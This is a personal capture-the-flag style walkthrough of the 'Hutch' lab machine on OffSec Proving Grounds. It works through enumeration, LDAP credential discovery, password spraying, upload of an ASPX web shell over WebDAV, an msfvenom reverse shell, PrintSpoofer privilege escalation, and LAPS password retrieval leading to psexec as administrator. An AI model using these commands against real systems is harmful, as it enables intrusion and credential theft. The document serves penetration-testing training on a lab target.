# NMAP

```
sudo nmap -sC -sV 192.168.247.122 -oN nmap-hutch
```

![[PG/Windows/attachments/Pasted image 20250705003007.png]]

All ports 
![[PG/Windows/attachments/Pasted image 20250705121623.png]]

# WEB

```
gobuster dir -u http://hutch.offsec/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobust.out
```

![[PG/Windows/attachments/Pasted image 20250705121226.png]]
- nothing

Fuzz sub-directories (target IIS servers)
```
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --sc 200,301 $URL/FUZZ
```

# SMB 

NXC - nada
![[PG/Windows/attachments/Pasted image 20250705121134.png]]

```
smbclient -L 192.168.247.122
```

# DNS Enum

```
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```

## DNS ENUM

```
dnsenum 192.168.175.122
```

![[PG/Windows/attachments/Pasted image 20250705122844.png]]
- nothing

# LDAP

ldapsearch to enumerate users
```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.247.122" "(objectclass=*)"
```

Username and password found in description
![[PG/Windows/attachments/Pasted image 20250705122944.png]]

Then get user listing 

```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.175.122" "(objectclass*)" | grep sAMAccountName:
```


# Kerbrute to check if pre-auth is off for anyone

```
kerbrute userenum -d hutch.offsec --dc 192.168.188.122 users
```

![[PG/Windows/attachments/Pasted image 20250705123350.png]]

# Crackmapexec to spray for re-used creds

```
crackmapexec smb $IP -u users 'CrabSharkJellyfish192' -d hutch.offsec
```

# Initial Access

Use fmcsorley and `CrabSharkJellyfish192` password to access webdav server 

Authenticate to WebDAV server 
```
cadaver $IP  
```

![[PG/Windows/attachments/Pasted image 20250705123818.png]]

Put an aspx web shell on the WebDAV server 

```
put /usr/share/webshells/aspx/cmdasp.aspx
```

navigate to /cmdasp.aspx for webshell access

Create reverse shell with msfvenom 

```
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4444 -f exe > revshell.exe
```

Start a listener and start the revshell.exe

![[PG/Windows/attachments/Pasted image 20250705124028.png]]

# Priv Esc #1

From `apppool\defaultapppool`
```
whoami /priv
```

![[PG/Windows/attachments/Pasted image 20250705124120.png]]

SeImpersonate can get us system via printspoofer or a potato exploit


# Printspoofer 

Download this executable https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

And execute 

![[PG/Windows/attachments/Pasted image 20250705124256.png]]

We're now the hutchdc

# Local Priv Esc # 2 

Use found creds from fmcsorley and ldapsearch to search for LAPS access

```
ldapsearch -x -H "ldap://192.168.188.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```

![[PG/Windows/attachments/Pasted image 20250705124512.png]]

With local admin credentials from LAPS, we can authenticate via PSexec:

```
impacket-psexec hutch.offsec/administrator:'3lvx699J31@]3C'@192.168.188.122 
```

![[PG/Windows/attachments/Pasted image 20250705124608.png]]

We are system. 

